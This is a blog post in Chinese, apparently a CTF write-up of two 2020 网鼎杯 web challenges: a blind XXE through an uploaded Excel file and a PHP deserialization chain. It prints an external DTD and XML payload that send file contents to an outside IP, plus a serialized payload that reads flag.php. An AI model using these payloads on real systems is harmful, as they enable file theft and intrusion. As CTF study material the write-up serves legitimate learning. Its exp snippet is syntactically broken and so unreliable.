@@ -1,0 +1,557 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+ <meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
+<meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
+<meta HTTP-EQUIV="expires" CONTENT="0"> 
+<title>2020-网鼎杯(青龙组) Web题目 WriteUp | loecho</title>	
+
+<link rel="stylesheet" href="https://loecho.me/styles/main.css">
+<script type="text/javascript">
+function getCSS()
+{
+        datetoday = new Date();
+        timenow=datetoday.getTime();
+        datetoday.setTime(timenow);
+        thehour = datetoday.getHours();
+
+        if (thehour<0)
+
+            display = "https://loecho.me/media/css/night.css";
+
+       else if (thehour>24)
+
+            display = "https://loecho.me/media/css/night.css";   
+
+        else if (thehour>0)
+           
+            display = "https://loecho.me/media/css/day.css";
+
+        else if (thehour<24)
+
+            display = "https://loecho.me/media/css/day.css";
+      
+
+var css = '<';
+        css+='link rel="stylesheet" href='+display+' \/';
+        css+='>';
+        document.write(css);
+}
+</script>
+<link href="https://fonts.googleapis.com/css?family=Dancing+Script|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
+<link href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css" rel="stylesheet" />
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<script type='text/javascript' src='https://loecho.me/media/scripts/script.js'></script>
+<link href="https://cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet" />
+  <script src="https://cdn.bootcss.com/wow/1.1.2/wow.min.js"></script>
+  <script src="https://cdn.bootcss.com/highlight.js/9.15.8/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  <script>wow=new WOW({boxClass:'wow',animateClass:'animated',offset:0,mobile:true,live:true});wow.init();</script>
+
+<script type="text/javascript">
+window.onload=getCSS();
+</script>
+
+
+ 	
+</head>
+<body class="post-template-default single single-post postid-70 single-format-standard">
+    <div id="wrapper">
+        
+			
+		<header id="header" class="site-header" 
+		
+		>
+			<div class="site-branding">
+									<h1 class="site-title"><a href="https://loecho.me" rel="home">loecho</a></h1>
+										
+					<h2 class="site-description"><h4>Red Team@loecho /CTFer@Web /SRC</h4></h2>
+										
+							</div>
+			<nav id="nav-wrapper">
+				<div class="container">
+					<div class="nav-toggle">
+						<div class="bars">
+							<div class="bar"></div>
+							<div class="bar"></div>
+							<div class="bar"></div>
+						</div>
+					</div>
+					<div class="clear"></div>
+					<ul id="" class="dove">
+		 
+
+</ul>
+</li>		
+		
+</ul>				</div>
+			</nav>
+						<div class="jingge">
+
+
+    
+
+    
+			
+<a  href="https://github.com/a1ices" target="_blank" ><i class="iconfont icon-github"></i></a>
+ 
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+			
+<a  href="1414596457" target="_blank" ><i class="iconfont icon-qq"></i></a>
+ 
+    
+
+    
+
+    
+        </header>
+
+		<div id="content" class="container">
+			<div class="row">
+	<div class="col-md-8 site-main">
+				
+<article id="post-70" class="post-70 post type-post status-publish format-standard hentry category-5 tag-10 tag-9 tag-11">
+
+	
+	                      
+		<div class="entry-content">
+			<h1 class="wow swing entry-title">2020-网鼎杯(青龙组) Web题目 WriteUp</h1>
+<div class="entry-meta">
+<div class="wow bounce">
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-05-10 21:15:25" itemprop="datePublished" pubdate="">2020-05-10</time></i>
+	          </div>
+			
+</span>
+													 
+		</div>
+                  
+			<div class="wow slideInLeft entry-summary song">
+				<h2 id="0x01-filejava">0x01 filejava</h2>
+<p><strong>考点: 任意文件读取  代码审计 java组件漏洞利用 盲XXE</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510212300.png" alt="" loading="lazy"></figure>
+<p><strong>1.随意上传文件,试了试<b>jsp.</b>可以上传,返回下载地址,发现有filename= 参数,fuzz一下,发现有任意文件读取</strong></p>
+<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510162422.png" alt="image-20200510132232664" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510132450.png" alt="image-20200510132322144" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510132449.png" alt="image-20200510132447272" loading="lazy"></figure>
+<p><strong>2.试着fuzz读flag,没有结果,读了下web.xml,那就把源码dows下来,审计一下</strong></p>
+<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510162726.png" alt="image-20200510135627670" loading="lazy"></figure>
+<p><strong>通过脚本,down下结果如下:</strong></p>
+<figure data-type="image" tabindex="6"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510163000.png" alt="image-20200510135301398" loading="lazy"></figure>
+<p><strong>3.看一下代码,发现有这个组件,印象中好像有xxe,于是构造的看一下,他的名字有要求:</strong></p>
+<figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510162919.png" alt="image-20200510162917198" loading="lazy"></figure>
+<p><strong>4. 构造一个xml的excel,修改根目录下的xml文件,dnslog探测一下,有回显:</strong></p>
+<figure data-type="image" tabindex="8"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510221922.png" alt="" loading="lazy"></figure>
+<p><strong>5. 那思路有了,构造恶意的dtd文件,远程加载,读一下flag:</strong></p>
+<p>-<strong>01. 配置好服务器上的dtd文件</strong></p>
+<pre><code class="language-xml">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://101.200.150.149:8086/%file;'&gt;&quot;&gt;
+</code></pre>
+<p>-<strong>02.修改excel的xml文件,payload如下</strong></p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
+&lt;!DOCTYPE ANY [
+&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;
+&lt;!ENTITY % remote SYSTEM &quot;http://101.200.150.149:8086/echo.dtd&quot;&gt;
+%remote;
+%all;
+]&gt;
+&lt;root&gt;&amp;send;&lt;/root&gt;
+&lt;Types xmlns=&quot;http://schemas.openxmlformats.org/package/2006/content-types&quot;&gt;&lt;Default Extension=&quot;rels&quot; ContentType=&quot;application/vnd.openxmlformats-package.relationships+xml&quot;/&gt;&lt;Default Extension=&quot;xml&quot; ContentType=&quot;application/xml&quot;/&gt;&lt;Override PartName=&quot;/xl/workbook.xml&quot; ContentType=&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml&quot;/&gt;&lt;Override PartName=&quot;/xl/worksheets/sheet1.xml&quot; ContentType=&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml&quot;/&gt;&lt;Override PartName=&quot;/xl/theme/theme1.xml&quot; ContentType=&quot;application/vnd.openxmlformats-officedocument.theme+xml&quot;/&gt;&lt;Override PartName=&quot;/xl/styles.xml&quot; ContentType=&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml&quot;/&gt;&lt;Override PartName=&quot;/docProps/core.xml&quot; ContentType=&quot;application/vnd.openxmlformats-package.core-properties+xml&quot;/&gt;&lt;Override PartName=&quot;/docProps/app.xml&quot; ContentType=&quot;application/vnd.openxmlformats-officedocument.extended-properties+xml&quot;/&gt;&lt;/Types&gt;
+</code></pre>
+<ul>
+<li><strong>03.上传,点击下载,看服务器,已经收到flag</strong></li>
+</ul>
+<figure data-type="image" tabindex="9"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510163651.png" alt="image-20200510155841496" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510155618.png" alt="image-20200510155615902" loading="lazy"></figure>
+<h2 id="0x02-areuserialz">0x02  AreUSerialz</h2>
+<p><strong>考点: php反序列化 利用链构造</strong></p>
+<figure data-type="image" tabindex="11"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510212350.png" alt="" loading="lazy"></figure>
+<p><strong>1.打开页面得到代码如下:</strong></p>
+<pre><code>&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = &quot;1&quot;;
+        $filename = &quot;/tmp/tmpfile&quot;;
+        $content = &quot;Hello World!&quot;;
+        $this-&gt;process();   
+    }
+
+    public function process() {
+        if($this-&gt;op == &quot;1&quot;) {
+            $this-&gt;write();       
+        } else if($this-&gt;op == &quot;2&quot;) {
+            $res = $this-&gt;read();
+            $this-&gt;output($res);
+        } else {
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        }
+    }
+
+    private function write() {
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+            if(strlen((string)$this-&gt;content) &gt; 100) {
+                $this-&gt;output(&quot;Too long!&quot;);
+                die();
+            }
+            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+            if($res) $this-&gt;output(&quot;Successful!&quot;);
+            else $this-&gt;output(&quot;Failed!&quot;);
+        } else {
+            $this-&gt;output(&quot;Failed!&quot;);
+        }
+    }
+
+    private function read() {
+        $res = &quot;&quot;;
+        if(isset($this-&gt;filename)) {
+            $res = file_get_contents($this-&gt;filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo &quot;[Result]: &lt;br&gt;&quot;;
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this-&gt;op === &quot;2&quot;)
+            $this-&gt;op = &quot;1&quot;;
+        $this-&gt;content = &quot;&quot;;
+        $this-&gt;process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+</code></pre>
+<p><strong>2.简单看下代码,有序列化操作过程:</strong></p>
+<ul>
+<li><strong>01.自己构造一下利用链,主要是绕过 is_vaild 函数,它规定了序列化内容中只能包含ascii可见字符,如果出现其他的字符则会返回false</strong></li>
+</ul>
+<figure data-type="image" tabindex="12"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510213029.png" alt="" loading="lazy"></figure>
+<ul>
+<li>
+<p><strong>02. 因为构造成功的内容中,肯定会包含%00,主要坑点在这,绕过这个的限制</strong></p>
+</li>
+<li>
+<p><strong>03. 我们构造利用链,输出序列化内容,我们自己构造exp</strong></p>
+</li>
+</ul>
+<pre><code>&lt;?php
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op=2;
+    protected $op=filename=&quot;php://filter/convert.base64-encode/resource=/web/html/flag.php&quot;;
+    protected $op=loecho;
+
+}
+$FileHandler = new FileHandler();
+$test = serialize($FileHandler);
+file_put_contents(&quot;test.txt&quot;,$test);
+
+</code></pre>
+<ul>
+<li><strong>运行结果如下:</strong></li>
+</ul>
+<figure data-type="image" tabindex="13"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510214636.png" alt="" loading="lazy"></figure>
+<ul>
+<li>04 修改下Payload,主要是 <b><em></b> 替换为 <b>%00</b>,在进行绕过,改为 <b>\00</em>\00</b>,这个坑是好哥们填的...</li>
+</ul>
+<pre><code>O:11:&quot;FileHandler&quot;:3:{s:5:&quot;\00*\00op&quot;;i:2;s:11:&quot;\00*\00filename&quot;;s:62:&quot;php://filter/convert.base64-encode/resource=/web/html/flag.php&quot;;s:10:&quot;\00*\00content&quot;;s:6:&quot;loecho&quot;;}
+
+</code></pre>
+<ul>
+<li><strong>05 还有一个坑就是,字母s为小写时,会回显,BadHack,我们手动改为大写S!</strong></li>
+</ul>
+<pre><code>str=O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:62:&quot;php://filter/convert.base64-encode/resource=/web/html/flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:6:&quot;loecho&quot;;}
+
+</code></pre>
+<p><strong>1. Paylaod打过去,看结果:</strong></p>
+<figure data-type="image" tabindex="14"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510215207.png" alt="" loading="lazy"></figure>
+<ul>
+<li><strong>我们使用伪协议读的,Base64解码一下:</strong></li>
+</ul>
+<figure data-type="image" tabindex="15"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/20200510215405.png" alt="" loading="lazy"></figure>
+<h2 id="0x03">0x03</h2>
+
+							</div>
+	<div class="wow bounceInDown vt-post-tags">
+ 
+					</div>						
+<nav class="navigation3 post-navigation3" role="navigation">
+		
+		<div class="nav-links3">
+      
+		<div class="wow bounceInLeft nav-previous3"><a href="https://loecho.me/rxcPG2L_G/" rel="prev"> Fastjson &lt; 1.2.47 RCE 利用</a></div>
+		 
+		 
+		<div class="wow bounceInRight nav-next3"><a href="https://loecho.me/MQsrzmFhV/" rel="next"> 跨站脚本攻击-鉴权功能实现(初步实现....)</a></div>
+		
+		</div>
+	</nav>
+	<div class="wow rollIn author-info" style="visibility: visible; animation-name: rollIn;">
+	<div class="author-avatar pull-left"><img src="https://loecho.me/images/avatar.png" ></div>
+ 
+	<div class="author-description"><div class="author-title"><div class="author-link" rel="author">Loecho</div></div>
+
+
+	<p class="author-bio">Red Team@loecho /CTFer@Web /SRC</p></div></div>
+	
+		</div>
+		
+ 
+		
+</article>
+
+<div id="marlin_lite_about_widget-2" class="wow bounceInUp widget marlin_lite_about_widget" data-wow-delay="0.1s">
+		
+        
+		<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://loecho.me/media/scripts/Valine.min.js'></script>
+
+<div class="comment"></div>
+<script>
+        new Valine({
+            // AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+            av: AV, 
+            el: '.comment',
+            lang: 'zh-cn',
+            
+            admin_email:'1414596457@qq.com',
+            
+            
+      emoticon_list: ["吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
+     	
+      	
+          
+      placeholder: '欢迎质疑'
+       
+        });
+    </script> 
+
+
+   
+  
+ 
+
+		</div>
+
+			</div>
+			
+
+
+<div class="tocc col l3 hide-on-med-and-down">
+	
+        <div class="toc-widget">
+			
+            <div class="toc-title"></div>
+			
+            <div id="toc-content">
+			
+			
+			</div>
+        </div>
+    </div>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.5.0/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '.entry-summary',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('.entry-summary').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>										 
+
+ 
+       
+
+
+			</div>
+		</div>
+
+		
+		 	<footer id="colophon" class="site-footer">
+
+			<div class="container">
+	
+				<div class="copyright"><a>Red Team@loecho /CTFer@Web /SRC </a><br>Theme:   <a href="https://github.com/shanbufun/gridea-theme-pan" target="_blank" title="Pan"><span>Pan</span></a>.  by <a href="https://shanbu.fun/" target="_blank"  title="山卜方" >Shanbufun</a></div>		
+			</div>
+		
+		</footer>
+
+</div>
+
+<script src="https://cdn.bootcss.com/fitvids/1.2.0/jquery.fitvids.min.js"></script>
+<script type='text/javascript' src='https://loecho.me/media/scripts/marlin-scripts.js'></script>
+ <script src="//tokinx.github.io/lately/lately.min.js"></script>
+  <script>jQuery(document).ready(function(){$.lately({'target':'.lately-a,.lately-b,.lately-c'})});</script>
+  <style type="text/css">a.back_to_top {
+    text-decoration: none;
+    position: fixed;
+    bottom: 40px;
+    right: 30px;
+    background: #f0f0f0;
+    height: 40px;
+    width: 40px;
+    border-radius: 50%;
+    line-height: 36px;
+    font-size: 18px;
+    text-align: center;
+    transition-duration: .5s;
+    transition-propety: background-color;
+    display: none;
+}
+
+a.back_to_top span {
+    color: #888;
+}
+
+a.back_to_top:hover {
+    cursor: pointer;
+    background: #dfdfdf;
+}
+
+a.back_to_top:hover span {
+    color: #555;
+}
+
+@media print, screen and (max-width: 580px) {
+    .back_to_top {
+        display: none !important;
+    }
+}
+
+
+
+</style><a id="back_to_top" href="#" class="back_to_top"><span><i class="iconfont icon-xiangshang"></i></span>
+</a>
+
+
+<script>$(document).ready((function(_this) {
+  return function() {
+    var bt;
+    bt = $('#back_to_top');
+    if ($(document).width() > 480) {
+      $(window).scroll(function() {
+        var st;
+        st = $(window).scrollTop();
+        if (st > 30) {
+          return bt.css('display', 'block');
+        } else {
+          return bt.css('display', 'none');
+        }
+      });
+      return bt.click(function() {
+        $('body,html').animate({
+          scrollTop: 0
+        }, 800);
+        return false;
+      });
+    }
+  };
+})(this));
+</script>
+
+		<script data-no-instant>
+    (function ($) {
+        $.extend({
+            adamsOverload: function () {
+                $('.navigation:eq(0)').remove();
+                $("").attr("rel" , "external");
+                $("a[rel='external'],a[rel='external nofollow']").attr("target","_blank");
+                $("a.vi").attr("rel" , "");
+                $.viewImage({
+                    'target'  : 'img',
+                    'exclude' : '.vsmile-icons img,.gallery img',
+                    'delay'   : 300
+                });
+                $.lately({
+                    'target' : '.commentmetadata a,.infos time,.post-list time'
+                });
+                prettyPrint();
+                
+                $('ul.links li a').each(function(){
+                    if($(this).parent().find('.bg').length==0){
+                        $(this).parent().append('<!---<div class="bg" style="background-image:url(https://c3.glgoo.top/s2/favicons?domain='+$(this).attr("href")+')"></div>--->')
+                    }
+                });
+            }
+        });
+    })(jQuery);
+    jQuery.adamsOverload();
+</script>
+
+</body>
+</html>
